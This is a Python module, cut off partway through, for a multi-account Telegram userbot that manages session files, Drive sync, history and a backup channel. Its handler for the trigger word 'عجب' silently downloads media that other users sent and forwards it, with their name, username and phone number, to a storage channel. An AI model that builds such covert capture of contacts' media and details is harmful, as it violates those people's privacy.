# -*- coding: utf-8 -*-
"""Core storage, configuration, Telegram client lifecycle, and utility logic."""

from .shared import *

# ============================================================
# 0) GOOGLE DRIVE / PATHS
# ============================================================

BASE_DIR = Path(os.getenv("TELEGRAM_DATA_DIR", str(Path.home() / "TelegramMaster")))

SYSTEM_DIR = BASE_DIR / "00_SYSTEM"
SESSIONS_DIR = BASE_DIR / "01_SESSIONS"
MEDIA_DIR = BASE_DIR / "02_MEDIA"
MEDIA_TEMP_DIR = MEDIA_DIR / "TEMP"
MEDIA_SAVED_DIR = MEDIA_DIR / "SAVED"
BACKUPS_DIR = BASE_DIR / "03_BACKUPS"
SESSION_BACKUPS_DIR = BACKUPS_DIR / "SESSIONS"
MEDIA_BACKUPS_DIR = BACKUPS_DIR / "MEDIA"
LOG_DIR = BASE_DIR / "04_LOGS"
RUNTIME_DIR = BASE_DIR / "05_RUNTIME"
AUTH_TEMP_DIR = RUNTIME_DIR / "AUTH_TEMP"

CONFIG_FILE = SYSTEM_DIR / "config.json"
ACCOUNTS_FILE = SYSTEM_DIR / "accounts.json"
SETTINGS_FILE = SYSTEM_DIR / "settings.json"
HISTORY_DB = SYSTEM_DIR / "history.db"
MANIFEST_FILE = SYSTEM_DIR / "README.txt"
LOG_FILE = LOG_DIR / "bot.log"
VAULT_FILE = SYSTEM_DIR / "secure_vault.enc"

for folder in (
    BASE_DIR, SYSTEM_DIR, SESSIONS_DIR, MEDIA_DIR, MEDIA_TEMP_DIR,
    MEDIA_SAVED_DIR, BACKUPS_DIR, SESSION_BACKUPS_DIR, MEDIA_BACKUPS_DIR,
    LOG_DIR, RUNTIME_DIR, AUTH_TEMP_DIR,
):
    folder.mkdir(parents=True, exist_ok=True)

if not MANIFEST_FILE.exists():
    MANIFEST_FILE.write_text(
        "Telegram Master V14.2.1\n\n"
        "00_SYSTEM  = local configuration and account state\n"
        "01_SESSIONS = Telegram .session files\n"
        "02_MEDIA   = temporary and saved media\n"
        "03_BACKUPS = optional local backup copies\n"
        "04_LOGS    = rotating application logs\n"
        "05_RUNTIME = runtime-only application data\n"
        "AUTH_TEMP  = temporary login sessions removed unless auth succeeds\n\n"
        "Secrets are supplied only through environment variables.\n",
        encoding="utf-8",
    )

TEMP_DOWNLOAD_DIR = MEDIA_TEMP_DIR


# ============================================================
# 0.5) GOOGLE DRIVE PERSISTENCE
# ============================================================

class GoogleDriveSync:
    """Drive-backed persistence using a service-account-accessible folder."""
    SCOPES = ["https://www.googleapis.com/auth/drive"]
    FOLDER_MIME = "application/vnd.google-apps.folder"

    def __init__(self, root: Path):
        self.root = root
        self.folder_id = os.getenv("GOOGLE_DRIVE_FOLDER_ID", "").strip()
        self.credentials_json = os.getenv("GOOGLE_SERVICE_ACCOUNT_JSON", "").strip()
        self.credentials_b64 = os.getenv("GOOGLE_SERVICE_ACCOUNT_JSON_B64", "").strip()
        self.service = None
        self.enabled = False
        self._initialized = False
        self._dirty = True

    def mark_dirty(self, _path: Optional[Path] = None):
        self._dirty = True

    def _init_service(self) -> bool:
        if self._initialized:
            return self.enabled
        self._initialized = True
        if not self.folder_id:
            logger.warning("Google Drive disabled: GOOGLE_DRIVE_FOLDER_ID missing.")
            return False
        raw = self.credentials_json
        if not raw and self.credentials_b64:
            try:
                import base64
                raw = base64.b64decode(self.credentials_b64).decode("utf-8")
            except Exception:
                logger.exception("Could not decode GOOGLE_SERVICE_ACCOUNT_JSON_B64.")
                return False
        if not raw:
            logger.warning("Google Drive disabled: service-account credentials missing.")
            return False
        try:
            from google.oauth2.service_account import Credentials
            from googleapiclient.discovery import build
            info = json.loads(raw)
            creds = Credentials.from_service_account_info(info, scopes=self.SCOPES)
            self.service = build("drive", "v3", credentials=creds, cache_discovery=False)
            self.enabled = True
            logger.info("Google Drive persistence initialized.")
            return True
        except Exception:
            logger.exception("Google Drive initialization failed.")
            self.enabled = False
            return False

    @staticmethod
    def _escape(value: str) -> str:
        return value.replace("\\", "\\\\").replace("'", "\\'")

    def _find_child(self, parent_id: str, name: str, mime_type: Optional[str] = None):
        if not self._init_service():
            return None
        q = [f"'{parent_id}' in parents", "trashed = false", f"name = '{self._escape(name)}'"]
        if mime_type:
            q.append(f"mimeType = '{mime_type}'")
        result = self.service.files().list(q=" and ".join(q), fields="files(id,name,mimeType,modifiedTime)", pageSize=100).execute()
        rows = result.get("files", [])
        return rows[0] if rows else None

    def _ensure_folder(self, parent_id: str, name: str) -> str:
        existing = self._find_child(parent_id, name, self.FOLDER_MIME)
        if existing:
            return existing["id"]
        created = self.service.files().create(
            body={"name": name, "mimeType": self.FOLDER_MIME, "parents": [parent_id]},
            fields="id",
        ).execute()
        return created["id"]

    def _remote_parent(self, rel_parent: Path) -> str:
        parent = self.folder_id
        for part in rel_parent.parts:
            if part in ("", "."):
                continue
            parent = self._ensure_folder(parent, part)
        return parent

    def pull(self) -> bool:
        if not self._init_service():
            return False
        try:
            self._pull_folder(self.folder_id, Path("."))
            self._dirty = False
            logger.info("Google Drive sync-down completed.")
            return True
        except Exception:
            logger.exception("Google Drive sync-down failed.")
            return False

    def _pull_folder(self, parent_id: str, rel_dir: Path):
        from googleapiclient.http import MediaIoBaseDownload
        token = None
        while True:
            response = self.service.files().list(
                q=f"'{parent_id}' in parents and trashed = false",
                fields="nextPageToken,files(id,name,mimeType,modifiedTime)",
                pageSize=1000,
                pageToken=token,
            ).execute()
            for item in response.get("files", []):
                rel = rel_dir / item["name"]
                local = self.root / rel
                if item.get("mimeType") == self.FOLDER_MIME:
                    local.mkdir(parents=True, exist_ok=True)
                    self._pull_folder(item["id"], rel)
                    continue
                download = not local.exists()
                if local.exists():
                    try:
                        lm = datetime.fromtimestamp(local.stat().st_mtime, tz=timezone.utc)
                        rm = datetime.fromisoformat(item["modifiedTime"].replace("Z", "+00:00"))
                        download = rm > lm
                    except Exception:
                        download = False
                if download:
                    local.parent.mkdir(parents=True, exist_ok=True)
                    request = self.service.files().get_media(fileId=item["id"])
                    with local.open("wb") as fh:
                        downloader = MediaIoBaseDownload(fh, request, chunksize=8 * 1024 * 1024)
                        done = False
                        while not done:
                            _, done = downloader.next_chunk()
            token = response.get("nextPageToken")
            if not token:
                break

    def sync_up(self, force: bool = False) -> bool:
        if not force and not self._dirty:
            return True
        if not self._init_service():
            return False
        try:
            from googleapiclient.http import MediaFileUpload
            excluded = ("02_MEDIA/TEMP", "05_RUNTIME/AUTH_TEMP")
            for path in self.root.rglob("*"):
                if not path.is_file():
                    continue
                rel = path.relative_to(self.root).as_posix()
                if any(rel == x or rel.startswith(x + "/") for x in excluded):
                    continue
                parent = self._remote_parent(path.relative_to(self.root).parent)
                existing = self._find_child(parent, path.name)
                media = MediaFileUpload(str(path), resumable=True)
                if existing:
                    self.service.files().update(fileId=existing["id"], media_body=media).execute()
                else:
                    self.service.files().create(body={"name": path.name, "parents": [parent]}, media_body=media, fields="id").execute()
            self._dirty = False
            logger.info("Google Drive sync-up completed.")
            return True
        except Exception:
            logger.exception("Google Drive sync-up failed.")
            return False

drive_sync = GoogleDriveSync(BASE_DIR)


def print_drive_layout():
    """Show the storage layout once at startup."""
    print("\n╔════════════════════════════════════════════════════════════╗")
    print("║              TELEGRAM MASTER — STORAGE LAYOUT              ║")
    print("╚════════════════════════════════════════════════════════════╝")
    print(f"📁 {BASE_DIR.name}/")
    print("├── 📁 00_SYSTEM/        config, accounts, settings, history")
    print("├── 📁 01_SESSIONS/      Telegram session files")
    print("├── 📁 02_MEDIA/")
    print("│   ├── 📁 TEMP/         temporary downloads")
    print("│   └── 📁 SAVED/        locally retained media")
    print("├── 📁 03_BACKUPS/")
    print("│   ├── 📁 SESSIONS/     optional local session backups")
    print("│   └── 📁 MEDIA/        optional local media backups")
    print("├── 📁 04_LOGS/          rotating logs")
    print("├── 📁 05_RUNTIME/       runtime-only files")
    print("│   └── 📁 AUTH_TEMP/    temporary login sessions")
    print("└── 📁 99_CODE/          project source code")
    print()

# ============================================================
# 1) LOGGING
# ============================================================

logger = logging.getLogger("TelegramMasterV14_5_fixed18_Serv00")
logger.setLevel(logging.INFO)
logger.propagate = False

if not logger.handlers:
    formatter = logging.Formatter(
        "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
    )

    file_handler = logging.handlers.RotatingFileHandler(
        LOG_FILE,
        maxBytes=5 * 1024 * 1024,
        backupCount=5,
        encoding="utf-8",
    )
    file_handler.setFormatter(formatter)

    stream_handler = logging.StreamHandler()
    stream_handler.setFormatter(formatter)

    logger.addHandler(file_handler)
    logger.addHandler(stream_handler)

# ============================================================
# 2) RUNTIME SETTINGS
# ============================================================

MAX_CONCURRENT_CLIENTS = 5
MAX_INFO_CONCURRENT = 3

MAX_RETRY = 3
RETRY_DELAY = 5
HTTP_TIMEOUT = 120

REMOTE_STATE_TIMEOUT = 10 * 60
CACHE_TTL = 60

BOT_TOKEN: Optional[str] = None
REMOTE_BOT_TOKEN: Optional[str] = None
REMOTE_ADMIN_IDS: set[int] = set()
BACKUP_CHANNEL_INPUT: Optional[str] = None
API_ID: Optional[int] = None
API_HASH: Optional[str] = None
VAULT_KEY: Optional[bytes] = None
GOOGLE_DRIVE_ENABLED = False

_bot_session: Optional[aiohttp.ClientSession] = None

# ============================================================
# 3) SAFE CONFIG FILE
# ============================================================

class ConfigManager:
    @staticmethod
    def load(file_path: Path, default: Optional[dict] = None) -> dict:
        if default is None:
            default = {}

        if not file_path.exists():
            return dict(default)

        try:
            with file_path.open("r", encoding="utf-8") as f:
                data = json.load(f)
            return data if isinstance(data, dict) else dict(default)

        except json.JSONDecodeError as e:
            logger.error("JSON decode error in %s: %s", file_path, e)
            backup_path = file_path.with_suffix(file_path.suffix + ".corrupted_backup")
            try:
                shutil.copy2(file_path, backup_path)
            except OSError as backup_error:
                logger.warning("Could not preserve corrupted config: %s", backup_error)
            return dict(default)

        except OSError as e:
            logger.error("Error loading %s: %s", file_path, e)
            return dict(default)

    @staticmethod
    def save(file_path: Path, data: dict) -> bool:
        try:
            file_path.parent.mkdir(parents=True, exist_ok=True)

            fd, temp_name = tempfile.mkstemp(
                prefix=f".{file_path.name}.",
                suffix=".tmp",
                dir=str(file_path.parent),
            )

            try:
                with os.fdopen(fd, "w", encoding="utf-8") as f:
                    json.dump(
                        data,
                        f,
                        indent=4,
                        ensure_ascii=False,
                    )
                    f.flush()
                    os.fsync(f.fileno())

                os.replace(temp_name, file_path)

            finally:
                if os.path.exists(temp_name):
                    try:
                        os.remove(temp_name)
                    except OSError:
                        pass

            drive_sync.mark_dirty(file_path)
            return True

        except OSError as e:
            logger.error("Error saving %s: %s", file_path, e)
            return False


# ============================================================
# 4) SQLITE HISTORY
# ============================================================

class HistoryStore:
    def __init__(self, db_path: Path):
        self.db_path = db_path
        self._initialize()

    def _connect(self):
        conn = sqlite3.connect(str(self.db_path), timeout=30)
        conn.row_factory = sqlite3.Row
        return conn

    def _initialize(self):
        with self._connect() as conn:
            conn.execute(
                """
                CREATE TABLE IF NOT EXISTS history (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TEXT NOT NULL,
                    sender_name TEXT,
                    sender_username TEXT,
                    phone TEXT,
                    file_name TEXT,
                    file_size_bytes INTEGER,
                    media_type TEXT,
                    caption_snippet TEXT
                )
                """
            )
            conn.execute(
                "CREATE INDEX IF NOT EXISTS idx_history_timestamp "
                "ON history(timestamp)"
            )
            conn.commit()

    def add(self, entry: dict):
        with self._connect() as conn:
            conn.execute(
                """
                INSERT INTO history (
                    timestamp,
                    sender_name,
                    sender_username,
                    phone,
                    file_name,
                    file_size_bytes,
                    media_type,
                    caption_snippet
                )
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    entry.get("timestamp"),
                    entry.get("sender_name"),
                    entry.get("sender_username"),
                    entry.get("phone"),
                    entry.get("file_name"),
                    entry.get("file_size_bytes", 0),
                    entry.get("media_type"),
                    entry.get("caption_snippet"),
                ),
            )
            conn.commit()
            drive_sync.mark_dirty(self.db_path)

    def last(self, limit: int = 10) -> List[dict]:
        with self._connect() as conn:
            rows = conn.execute(
                """
                SELECT timestamp, sender_name, sender_username, phone,
                       file_name, file_size_bytes, media_type, caption_snippet
                FROM history
                ORDER BY id DESC
                LIMIT ?
                """,
                (limit,),
            ).fetchall()

        return [dict(row) for row in rows]

history_store = HistoryStore(HISTORY_DB)

# ============================================================
# 5) SETTINGS MANAGER
# ============================================================

class SettingsManager:
    def __init__(self):
        self._active_status: Dict[str, bool] = {}
        self._load()

    def _load(self):
        data = ConfigManager.load(SETTINGS_FILE, {"accounts": {}})
        self._active_status = {}

        for name, info in data.get("accounts", {}).items():
            self._active_status[name] = bool(info.get("active", True))

    def save(self):
        data = {
            "accounts": {
                name: {"active": active}
                for name, active in self._active_status.items()
            }
        }
        ConfigManager.save(SETTINGS_FILE, data)

    def get(self, session_name: str, default: bool = True) -> bool:
        return self._active_status.get(session_name, default)

    def set(self, session_name: str, active: bool):
        self._active_status[session_name] = bool(active)
        self.save()

    def toggle(self, session_name: str) -> bool:
        new_status = not self.get(session_name)
        self.set(session_name, new_status)
        return new_status

    def remove(self, session_name: str):
        if session_name in self._active_status:
            del self._active_status[session_name]
            self.save()

    def sync_with_sessions(self):
        session_names = get_session_files()
        changed = False

        for name in session_names:
            if name not in self._active_status:
                self._active_status[name] = True
                changed = True

        stale = [n for n in self._active_status if n not in session_names]
        for name in stale:
            del self._active_status[name]
            changed = True

        if changed:
            self.save()

        return dict(self._active_status)

settings_manager = SettingsManager()

# ============================================================
# 6) TELEGRAM CLIENT MANAGER
# ============================================================

class ClientManager:
    def __init__(self):
        self.clients: Dict[str, TelegramClient] = {}
        self.tasks: Dict[str, asyncio.Task] = {}
        self.lock = asyncio.Lock()

    def get(self, name: str) -> Optional[TelegramClient]:
        return self.clients.get(name)

    def names(self) -> List[str]:
        return list(self.clients.keys())

    async def add_running_client(
        self,
        name: str,
        client: TelegramClient,
    ):
        async with self.lock:
            self.clients[name] = client

            task = asyncio.create_task(
                self._run_client(name, client),
                name=f"telegram-client-{name}",
            )
            self.tasks[name] = task

    async def _run_client(self, name: str, client: TelegramClient):
        try:
            await client.run_until_disconnected()
        except asyncio.CancelledError:
            raise
        except Exception:
            logger.exception("Client task crashed for %s", name)
        finally:
            async with self.lock:
                current = self.clients.get(name)
                if current is client:
                    self.clients.pop(name, None)

                task = self.tasks.get(name)
                current_task = asyncio.current_task()
                if task is current_task:
                    self.tasks.pop(name, None)

    async def remove(self, name: str):
        async with self.lock:
            client = self.clients.pop(name, None)
            task = self.tasks.pop(name, None)

        if task and not task.done():
            task.cancel()
            await asyncio.gather(task, return_exceptions=True)

        if client:
            try:
                await client.disconnect()
            except Exception as e:
                logger.warning("Disconnect error for %s: %s", name, e)

    async def stop_all(self):
        names = self.names()
        if names:
            await asyncio.gather(
                *(self.remove(name) for name in names),
                return_exceptions=True,
            )

client_manager = ClientManager()

# ============================================================
# 7) REMOTE STATE
# ============================================================

remote_state: Dict[int, dict] = {}
remote_state_lock = asyncio.Lock()

async def clear_remote_state(chat_id: int):
    async with remote_state_lock:
        state = remote_state.pop(chat_id, None)

    if not state:
        return

    client = state.get("client")
    if client:
        try:
            await client.disconnect()
        except Exception:
            pass

    if state.get("temp_session"):
        session_name = state.get("session_name")
        if session_name:
            delete_temp_session_files(session_name)

async def cleanup_expired_remote_states():
    now = time.monotonic()
    expired = []

    async with remote_state_lock:
        for chat_id, state in remote_state.items():
            if now - state.get("last_activity", now) > REMOTE_STATE_TIMEOUT:
                expired.append(chat_id)

    for chat_id in expired:
        await clear_remote_state(chat_id)
        logger.info("Expired remote state for chat_id=%s", chat_id)

    purge_stale_auth_temp_sessions()

# ============================================================
# 8) DEVICE DATA
# ============================================================

DEVICE_MODEL = os.getenv("TELEGRAM_DEVICE_MODEL", "TelegramMaster Serv00")
SYSTEM_VERSION = os.getenv("TELEGRAM_SYSTEM_VERSION", "Linux")

def get_device_model(_filename_hash: str) -> Tuple[str, str]:
    return DEVICE_MODEL, SYSTEM_VERSION


def generate_session_filename(phone: str) -> str:
    return f"{int(time.time())}_{phone}"

# ============================================================
# 9) SESSION FILE HELPERS
# ============================================================

def get_session_files() -> List[str]:
    if not SESSIONS_DIR.exists():
        return []

    return sorted(
        p.stem
        for p in SESSIONS_DIR.iterdir()
        if p.is_file() and p.name.endswith(".session")
    )


def delete_session_files(session_name: str):
    for ext in (".session", ".session-journal"):
        path = SESSIONS_DIR / f"{session_name}{ext}"
        try:
            if path.exists():
                path.unlink()
                logger.info("Deleted session file: %s", path)
        except OSError as e:
            logger.warning("Could not delete %s: %s", path, e)


def delete_temp_session_files(session_name: str):
    for ext in (".session", ".session-journal"):
        path = AUTH_TEMP_DIR / f"{session_name}{ext}"
        try:
            if path.exists():
                path.unlink()
                logger.info("Deleted temporary auth session: %s", path)
        except OSError as e:
            logger.warning("Could not delete temporary session %s: %s", path, e)


def promote_authenticated_session(session_name: str) -> bool:
    temp_files = [
        AUTH_TEMP_DIR / f"{session_name}.session",
        AUTH_TEMP_DIR / f"{session_name}.session-journal",
    ]
    existing = [p for p in temp_files if p.exists()]

    if not (AUTH_TEMP_DIR / f"{session_name}.session").exists():
        logger.error("Temporary authenticated session is missing: %s", session_name)
        return False

    final_session = SESSIONS_DIR / f"{session_name}.session"
    final_journal = SESSIONS_DIR / f"{session_name}.session-journal"

    try:
        if final_session.exists():
            logger.error("Refusing to overwrite existing session: %s", final_session)
            delete_temp_session_files(session_name)
            return False

        tmp_final = SESSIONS_DIR / f".{session_name}.promote.tmp"
        shutil.copy2(AUTH_TEMP_DIR / f"{session_name}.session", tmp_final)
        os.replace(tmp_final, final_session)

        temp_journal = AUTH_TEMP_DIR / f"{session_name}.session-journal"
        if temp_journal.exists():
            tmp_journal = SESSIONS_DIR / f".{session_name}.journal.promote.tmp"
            shutil.copy2(temp_journal, tmp_journal)
            os.replace(tmp_journal, final_journal)

        for path in existing:
            try:
                path.unlink()
            except OSError:
                pass

        drive_sync.mark_dirty(final_session)
        logger.info("Authenticated session promoted to 01_SESSIONS: %s", session_name)
        return True

    except Exception:
        logger.exception("Failed to promote authenticated session: %s", session_name)
        for leftover in (
            SESSIONS_DIR / f".{session_name}.promote.tmp",
            SESSIONS_DIR / f".{session_name}.journal.promote.tmp",
        ):
            try:
                if leftover.exists():
                    leftover.unlink()
            except OSError:
                pass
        delete_session_files(session_name)
        return False


def purge_stale_auth_temp_sessions(max_age_seconds: int = REMOTE_STATE_TIMEOUT):
    now = time.time()
    for path in AUTH_TEMP_DIR.glob("*.session"):
        try:
            if now - path.stat().st_mtime > max_age_seconds:
                delete_temp_session_files(path.stem)
        except OSError:
            pass

# ============================================================
# 10) ACCOUNTS STORAGE
# ============================================================

def load_accounts() -> dict:
    data = ConfigManager.load(ACCOUNTS_FILE, {})
    changed = False
    for _name, info in data.items():
        if not isinstance(info, dict):
            continue
        if "two_fa" in info:
            info.pop("two_fa", None)
            info["two_fa_enabled"] = True
            changed = True
        elif "two_fa_enabled" not in info:
            info["two_fa_enabled"] = False
            changed = True
    if changed:
        ConfigManager.save(ACCOUNTS_FILE, data)
    return data

def save_accounts(accounts: dict) -> bool:
    return ConfigManager.save(ACCOUNTS_FILE, accounts)

def normalize_phone(value: str) -> str:
    return re.sub(r"\D", "", value or "")

def find_account_by_phone(phone: str) -> Optional[Tuple[str, dict]]:
    target = normalize_phone(phone)
    if not target:
        return None
    for session_name, info in load_accounts().items():
        if info.get("logged_out"):
            continue
        if normalize_phone(str(info.get("phone", ""))) == target:
            return session_name, info
    return None

def upsert_account(session_name: str, data: dict):
    accounts = load_accounts()
    accounts[session_name] = data
    save_accounts(accounts)

def remove_account(session_name: str):
    accounts = load_accounts()
    if session_name in accounts:
        del accounts[session_name]
        save_accounts(accounts)

# ============================================================
# 11) SECRETS / COLAB
# ============================================================

def load_runtime_secrets():
    global BOT_TOKEN, REMOTE_BOT_TOKEN, REMOTE_ADMIN_IDS, BACKUP_CHANNEL_INPUT
    global API_ID, API_HASH, GOOGLE_DRIVE_ENABLED

    api_id_raw = os.getenv("TELEGRAM_API_ID", "").strip()
    api_hash = os.getenv("TELEGRAM_API_HASH", "").strip()
    bot_token = os.getenv("TELEGRAM_BOT_TOKEN", "").strip()
    remote_token = os.getenv("TELEGRAM_REMOTE_BOT_TOKEN", "").strip()
    admin_ids_raw = os.getenv("TELEGRAM_REMOTE_ADMIN_IDS", "").strip()
    backup_channel_raw = os.getenv("TELEGRAM_BACKUP_CHANNEL", "").strip()
    vault_key_raw = os.getenv("TELEGRAM_2FA_VAULT_KEY", "").strip()

    if not api_id_raw or not api_hash or not bot_token or not remote_token:
        raise RuntimeError(
            "Missing required Telegram environment variables."
        )

    try:
        API_ID = int(api_id_raw)
    except (TypeError, ValueError):
        raise ValueError("TELEGRAM_API_ID is invalid.")

    API_HASH = api_hash
    BOT_TOKEN = bot_token
    REMOTE_BOT_TOKEN = remote_token
    BACKUP_CHANNEL_INPUT = backup_channel_raw or None

    global VAULT_KEY
    if vault_key_raw:
        try:
            candidate_key = vault_key_raw.encode("ascii")
            Fernet(candidate_key)
            VAULT_KEY = candidate_key
            logger.info("2FA vault key loaded.")
        except Exception as exc:
            raise ValueError(
                "TELEGRAM_2FA_VAULT_KEY is invalid. Generate a Fernet key."
            ) from exc
    else:
        VAULT_KEY = None
        logger.warning(
            "2FA vault key not configured; 2FA passwords will not be stored."
        )

    REMOTE_ADMIN_IDS = set()
    for raw in admin_ids_raw.split(","):
        raw = raw.strip()
        if raw:
            try:
                REMOTE_ADMIN_IDS.add(int(raw))
            except ValueError:
                logger.warning("Ignoring invalid admin ID environment value.")

    if not REMOTE_ADMIN_IDS:
        raise RuntimeError(
            "TELEGRAM_REMOTE_ADMIN_IDS must contain at least one numeric Telegram user ID."
        )

    # Serv00 keeps persistent application data locally.
    # Google Drive remains available as an optional secondary backup.
    drive_flag = os.getenv("GOOGLE_DRIVE_ENABLED", "0").strip().lower()
    GOOGLE_DRIVE_ENABLED = drive_flag in {"1", "true", "yes", "on"}

    drive_sync.folder_id = os.getenv("GOOGLE_DRIVE_FOLDER_ID", "").strip()
    drive_sync.credentials_json = os.getenv(
        "GOOGLE_SERVICE_ACCOUNT_JSON", ""
    ).strip()
    drive_sync.credentials_b64 = os.getenv(
        "GOOGLE_SERVICE_ACCOUNT_JSON_B64", ""
    ).strip()

    if GOOGLE_DRIVE_ENABLED:
        if not drive_sync.folder_id or not (
            drive_sync.credentials_json or drive_sync.credentials_b64
        ):
            raise RuntimeError(
                "GOOGLE_DRIVE_ENABLED=1 requires GOOGLE_DRIVE_FOLDER_ID "
                "and service-account credentials."
            )
        logger.info("Google Drive secondary persistence enabled.")
    else:
        logger.info("Serv00 local persistence enabled; Google Drive sync is OFF.")


# ============================================================
# 12) HTTP SESSION / BOT API
# ============================================================

async def get_bot_session() -> aiohttp.ClientSession:
    global _bot_session

    if _bot_session is None or _bot_session.closed:
        timeout = aiohttp.ClientTimeout(total=HTTP_TIMEOUT)
        _bot_session = aiohttp.ClientSession(timeout=timeout)

    return _bot_session

async def close_bot_session():
    global _bot_session

    if _bot_session and not _bot_session.closed:
        await _bot_session.close()

    _bot_session = None

async def validate_channel_via_bot(channel_input: str) -> bool:
    if not BOT_TOKEN:
        return False

    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChat"
        session = await get_bot_session()

        async with session.post(
            url,
            json={"chat_id": channel_input},
        ) as resp:
            if resp.status == 200:
                return True

            text = await resp.text()
            logger.warning("Bot getChat failed: HTTP %s - %s", resp.status, text[:300])
            return False

    except Exception as e:
        logger.warning("validate_channel_via_bot error: %s", e)
        return False

async def send_via_bot(
    file_path: str,
    caption: str,
    chat_id: Any,
    retry: int = 2,
) -> bool:
    if not BOT_TOKEN:
        return False

    for attempt in range(1, retry + 1):
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            session = await get_bot_session()

            data = aiohttp.FormData()
            data.add_field("chat_id", str(chat_id))
            data.add_field("caption", caption)

            with open(file_path, "rb") as f:
                data.add_field(
                    "document",
                    f,
                    filename=os.path.basename(file_path),
                )

                async with session.post(url, data=data) as resp:
                    if resp.status == 200:
                        logger.info("File sent via Bot API successfully.")
                        return True

                    response_text = await resp.text()
                    logger.error(
                        "Bot API error HTTP %s: %s",
                        resp.status,
                        response_text[:500],
                    )

                    if resp.status in (400, 403):
                        return False

        except asyncio.TimeoutError:
            logger.warning("Bot upload timeout on attempt %s", attempt)

        except OSError as e:
            logger.error("Could not read upload file: %s", e)
            return False

        except Exception:
            logger.exception("Bot upload error on attempt %s", attempt)

        if attempt < retry:
            delay = RETRY_DELAY * (2 ** (attempt - 1))
            await asyncio.sleep(min(delay, 30))

    return False

# ============================================================
# 13) BACKUP CHANNEL
# ============================================================

backup_channel_entity = None
backup_channel_input_cached = None

def get_configured_backup_channel() -> Optional[str]:
    if BACKUP_CHANNEL_INPUT:
        return str(BACKUP_CHANNEL_INPUT).strip() or None

    config = ConfigManager.load(CONFIG_FILE)
    value = config.get("backup_channel")
    if value is None:
        return None
    value = str(value).strip()
    return value or None

async def get_backup_channel(
    client: TelegramClient,
) -> Optional[Any]:
    global backup_channel_entity
    global backup_channel_input_cached

    channel_input = get_configured_backup_channel()

    if not channel_input:
        return None

    channel_input = str(channel_input).strip()

    if (
        backup_channel_entity is not None
        and backup_channel_input_cached == channel_input
    ):
        return backup_channel_entity

    try:
        if channel_input.lstrip("-").isdigit():
            entity = await client.get_entity(int(channel_input))
        else:
            entity = await client.get_entity(channel_input)

        backup_channel_entity = entity
        backup_channel_input_cached = channel_input

        return entity

    except Exception as e:
        logger.warning("Could not resolve backup channel: %s", e)
        return None

async def send_to_backup_channel(
    client: TelegramClient,
    file_path: str,
    caption: str,
    retry: int = MAX_RETRY,
) -> bool:
    if not os.path.exists(file_path):
        logger.error("Backup file not found: %s", file_path)
        return False

    channel_input = get_configured_backup_channel()

    if not channel_input:
        logger.warning("Backup channel is not configured.")
        return False

    channel_input = str(channel_input).strip()

    try:
        chat_id = (
            int(channel_input)
            if channel_input.lstrip("-").isdigit()
            else channel_input
        )
    except (TypeError, ValueError):
        chat_id = channel_input

    entity = await get_backup_channel(client)

    if entity is not None:
        for attempt in range(1, retry + 1):
            try:
                await client.send_file(
                    entity,
                    file_path,
                    caption=caption,
                    force_document=False,
                )
                logger.info(
                    "Backup sent through user client: attempt %s",
                    attempt,
                )
                return True

            except FloodWaitError as e:
                logger.warning(
                    "FloodWait while backing up: %s seconds",
                    e.seconds,
                )
                await asyncio.sleep(e.seconds)

            except Exception as e:
                logger.warning(
                    "Backup attempt %s failed: %s",
                    attempt,
                    e,
                )

                error_text = str(e)
                access_error = any(
                    marker in error_text
                    for marker in (
                        "Invalid channel object",
                        "CHAT_ADMIN_REQUIRED",
                        "USER_NOT_PARTICIPANT",
                        "Could not find the input entity",
                    )
                )

                if access_error:
                    if await send_via_bot(
                        file_path,
                        caption,
                        chat_id,
                    ):
                        return True

            if attempt < retry:
                await asyncio.sleep(
                    min(RETRY_DELAY * (2 ** (attempt - 1)), 60)
                )

    return await send_via_bot(
        file_path,
        caption,
        chat_id,
        retry=MAX_RETRY,
    )

# ============================================================
# 14) GENERAL HELPERS
# ============================================================

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

async def async_input(prompt: str) -> str:
    return await asyncio.to_thread(input, prompt)

def create_progress_callback():
    last_percent = [-1]

    def callback(current, total):
        if total > 0:
            pct = int((current / total) * 100)

            if pct % 10 == 0 and pct != last_percent[0]:
                logger.info("Progress: %s%%", pct)
                last_percent[0] = pct

    return callback

def sanitize_display_name(value: str) -> str:
    return (
        value.replace(" ", "_")
        .replace(".", "")
        .replace(",", "")
        .replace("\n", "_")
        .replace("\r", "_")
    )

# ============================================================
# 15) HISTORY COMPATIBILITY
# ============================================================

def log_file_history(entry: dict):
    try:
        history_store.add(entry)
    except Exception:
        logger.exception("Failed to write history")

# ============================================================
# 16) عجب / .history
# ============================================================

def setup_bot_handlers(
    client: TelegramClient,
    session_name: str,
):
    @client.on(events.NewMessage(pattern=r"^عجب$"))
    async def ajab_handler(event):
        if not event.out:
            return

        reply = await event.get_reply_message()

        if not reply:
            try:
                await event.delete()
            except Exception:
                pass
            return

        if not reply.media:
            try:
                await event.delete()
            except Exception:
                pass
            return

        if not (
            hasattr(reply.media, "document")
            or hasattr(reply.media, "photo")
        ):
            try:
                await event.delete()
            except Exception:
                pass
            return

        file_path = None

        try:
            sender = await event.get_sender()

            first_name = getattr(sender, "first_name", "") or ""
            last_name = getattr(sender, "last_name", "") or ""

            full_name = (
                f"{first_name} {last_name}".strip()
                or "Unknown"
            )

            username = (
                f"@{sender.username}"
                if getattr(sender, "username", None)
                else "No username"
            )

            phone = getattr(sender, "phone", None) or "Unknown"

            if reply.photo:
                media_type = "photo"
            elif reply.video:
                media_type = "video"
            elif reply.document:
                media_type = "document"
            else:
                media_type = "media"

            progress_cb = create_progress_callback()

            file_path = await client.download_media(
                reply,
                file=str(TEMP_DOWNLOAD_DIR),
                progress_callback=progress_cb,
            )

            if not file_path:
                await event.edit("❌ دانلود ناموفق بود.")
                return

            timestamp = datetime.now().strftime(
                "%Y-%m-%d %H:%M:%S"
            )

            safe_name = sanitize_display_name(full_name)

            hashtags = (
                f"#{safe_name} "
                f"#date_{datetime.now().strftime('%Y-%m-%d')} "
                f"#{media_type}"
            )

            caption = (
                f"📁 {full_name} ({username})\n"
                f"📞 {phone}\n"
                f"🕒 {timestamp}\n"
                f"{hashtags}"
            )

            if reply.text:
                caption += f"\n📄 {reply.text[:200]}"

            backup_ok = await send_to_backup_channel(
                client,
                file_path,
                caption,
            )

            if not backup_ok:
                logger.error(
